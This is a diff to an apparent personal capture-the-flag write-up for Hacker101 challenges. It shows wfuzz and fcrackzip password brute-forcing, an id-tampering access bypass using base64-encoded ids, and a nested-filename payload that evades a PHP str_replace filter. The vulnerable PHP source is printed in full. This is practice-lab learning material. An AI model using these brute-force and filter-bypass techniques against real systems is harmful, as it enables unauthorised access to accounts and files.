@@ -33,3 +33,63 @@ wfuzz -zfile,/wordlists/passwords.txt --hs 'Invalid Password' -d 'username=acces
 - after a bit of research, I discovered fcrackzip and bruteforced the flag.txt password
 `fcrackzip -u -D -p wordlists/passwords.txt my_secure_files_not_for_you.zip`
 - the password was 'hahahaha'
+
+flag 2
+- ik these are out of order, but secure login looked most interesting anyways
+- next I went to people rater, which was a page with a list of names as buttons and the option to load more
+- clicking on a name pushed an alert to your screen with some random negative adjective, but no changes to the url were made
+- after checking inspect, I noticed each person has a similar id that looks like base64 encoded data
+- decoding Tea Avery's returned `{"id":2}`
+- since that name is the first on the list, I decided to try and change the id to 1 by base64 encoding the same format
+- this made the response concerningly positive, but no flag. it seemed like there was imformation I wasn't seeing, so I kept digging
+- going to the network tag in inspect, I noticed that when a button is pressed, a request to a JSON page is made
+- I decided to try and navigate to the JSON version of the page, by using the id=1 filepath
+`https://66eb8eed35791300628d3d4f7b00bccf.ctf.hacker101.com/people-rater/entry/?id=eyJpZCI6MX0K`
+- success! (the id belonged to the grinch, of course)
+
+flag 3
+- I was 100% stuck with this one so I decided to look up a writeup for it (spoiler alert they started talking about APIs, I got scared, we'll come back to it maybe)
+
+flag 5
+- navigating to the diary button, the first thing I notcied was the url path `/my-diary/?template=entries.html`
+- trying to go the the `/my-diary` path just redirects you to the template path
+- next I just tried vieweing the `/my-diary/entries.html` filepath itself, which worked
+- this means that the `template` directory was loading files that it itself contained
+- knowing this, we can try to access other files within the `template` directory
+- I tried to access an index file using `index.html` (didn't work) and `index.php` (worked!)
+```php
+<?php
+include_once('../../Flags.php');
+if( isset($_GET["template"])  ){
+    $page = $_GET["template"];
+    //remove non allowed characters
+    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
+    //protect admin.php from being read
+    $page = str_replace("admin.php","",$page);
+    //I've changed the admin file to secretadmin.php for more security!
+    $page = str_replace("secretadmin.php","",$page);
+    //check file exists
+    if( file_exists($page) ){
+        $contents = file_get_contents($page);
+        $contents = str_replace('!'.'FLAG!',Flags::get(5),$contents);
+        echo $contents;
+    }else{
+        //redirect to home
+        header("Location: ../my-diary/?template=entries.html");
+        exit();
+    }
+}else{
+    //redirect to home
+    header("Location: ../my-diary/?template=entries.html");
+    exit();
+}
+```
+- I navigated to /my-diary/secretadmin.php, and got the message `You cannot view this page from your IP Address`
+- the reason why this doesn't work is because of the character replacement, so the filepath needs to be modified, so if admin.php and secretadmin.php are removed, it still reads secretadmin.php
+- `secretadsecretaadmin.phpdmin.phpmin.php`
+- remove admin.php
+- `secretadsecretadmin.phpmin.php`
+- remove secretadmin.php
+- `secretadmin.php`
+- replace the filepath - `/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php`
+- success!
